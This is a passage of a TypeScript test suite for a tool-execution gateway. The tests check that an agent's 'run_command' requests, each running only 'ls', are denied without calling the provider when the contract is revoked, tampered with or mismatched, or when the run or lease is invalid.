      const gateway = new ToolExecutionGateway({
        coordinator: fixture.coordinator,
        clock: fixture.clock,
      });

      const request: ToolRequest<"run_command"> = {
        requestId: "req-fail-resource",
        runId: fixture.run.runId,
        toolName: "run_command",
        input: { argv: ["ls"], cwd: ".", timeoutMs: 6000 },
      };

      const result = await gateway.execute(request, fixture.context);
      expect(result.status).toBe("FAILED");
      expect(result.error?.code).toBe("TOOL_TIMEOUT");
      expect(fixture.provider.calls).toBe(0);
    });

    it("verifies provider.calls === 0 on CONTRACT_REVOKED", async () => {
      const fixture = setupFixture();
      fixture.store.revokeContract(
        fixture.contract.spec.contractId,
        fixture.contract.spec.version,
        "Contract revoked"
      );

      const gateway = new ToolExecutionGateway({
        coordinator: fixture.coordinator,
        clock: fixture.clock,
      });

      const request: ToolRequest<"run_command"> = {
        requestId: "req-fail-revoked",
        runId: fixture.run.runId,
        toolName: "run_command",
        input: { argv: ["ls"], cwd: "." },
      };

      const result = await gateway.execute(request, fixture.context);
      expect(result.status).toBe("FAILED");
      expect(result.error?.code).toBe("CAPABILITY_DENIED");
      expect(result.error?.message).toContain("REVOKED");
      expect(fixture.provider.calls).toBe(0);
    });

    it("verifies provider.calls === 0 on CONTRACT_INTEGRITY_FAILURE", async () => {
      const fixture = setupFixture();
      fixture.store.transaction(() => {
        const stmt = (fixture.store as any).db.prepare(
          `UPDATE runs SET contract_hash = ? WHERE run_id = ?`
        );
        stmt.run(
          "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
          fixture.run.runId
        );
      });

      const gateway = new ToolExecutionGateway({
        coordinator: fixture.coordinator,
        clock: fixture.clock,
      });

      const request: ToolRequest<"run_command"> = {
        requestId: "req-fail-integrity",
        runId: fixture.run.runId,
        toolName: "run_command",
        input: { argv: ["ls"], cwd: "." },
      };

      const result = await gateway.execute(request, fixture.context);
      expect(result.status).toBe("FAILED");
      expect(result.error?.code).toBe("CAPABILITY_DENIED");
      expect(result.error?.message).toContain("integrity mismatch");
      expect(fixture.provider.calls).toBe(0);
    });

    it("verifies provider.calls === 0 on CONTRACT_ASSOCIATION_FAILURE", async () => {
      const fixture = setupFixture();
      const otherTask = fixture.coordinator.createTask({
        title: "other",
        description: "other",
        inputPayload: {},
      });
      const otherContract = createAndActivateContract(fixture.store, otherTask.taskId);

      fixture.store.transaction(() => {
        const stmt = (fixture.store as any).db.prepare(
          `UPDATE runs SET contract_id = ?, contract_version = ?, contract_hash = ? WHERE run_id = ?`
        );
        stmt.run(
          otherContract.spec.contractId,
          otherContract.spec.version,
          otherContract.contentHash,
          fixture.run.runId
        );
      });

      const gateway = new ToolExecutionGateway({
        coordinator: fixture.coordinator,
        clock: fixture.clock,
      });

      const request: ToolRequest<"run_command"> = {
        requestId: "req-fail-association",
        runId: fixture.run.runId,
        toolName: "run_command",
        input: { argv: ["ls"], cwd: "." },
      };

      const result = await gateway.execute(request, fixture.context);
      expect(result.status).toBe("FAILED");
      expect(result.error?.code).toBe("CAPABILITY_DENIED");
      expect(result.error?.message).toContain("belongs to task");
      expect(fixture.provider.calls).toBe(0);
    });

    it("verifies provider.calls === 0 on INVALID_RUN", async () => {
      const fixture = setupFixture();
      const gateway = new ToolExecutionGateway({
        coordinator: fixture.coordinator,
        clock: fixture.clock,
      });

      const badContext: TrustedToolInvocationContext = {
        ...fixture.context,
        runId: "run-does-not-exist",
      };

      const request: ToolRequest<"run_command"> = {
        requestId: "req-fail-invalid-run",
        runId: "run-does-not-exist",
        toolName: "run_command",
        input: { argv: ["ls"], cwd: "." },
      };

      const result = await gateway.execute(request, badContext);
      expect(result.status).toBe("FAILED");
      expect(result.error?.code).toBe("INVALID_TOOL_INPUT");
      expect(fixture.provider.calls).toBe(0);
    });

    it("verifies provider.calls === 0 on LEASE_LOST", async () => {
      const fixture = setupFixture();
      const gateway = new ToolExecutionGateway({
        coordinator: fixture.coordinator,
        clock: fixture.clock,
      });

      const staleContext: TrustedToolInvocationContext = {
        ...fixture.context,
        leaseId: "stale-expired-lease-id",
      };

      const request: ToolRequest<"run_command"> = {
        requestId: "req-fail-lease",
        runId: fixture.run.runId,
        toolName: "run_command",
        input: { argv: ["ls"], cwd: "." },
      };

      const result = await gateway.execute(request, staleContext);
      expect(result.status).toBe("FAILED");
      expect(result.error?.code).toBe("CAPABILITY_DENIED");
      expect(result.error?.message?.toLowerCase()).toContain("lease");
      expect(fixture.provider.calls).toBe(0);
    });
  });
});
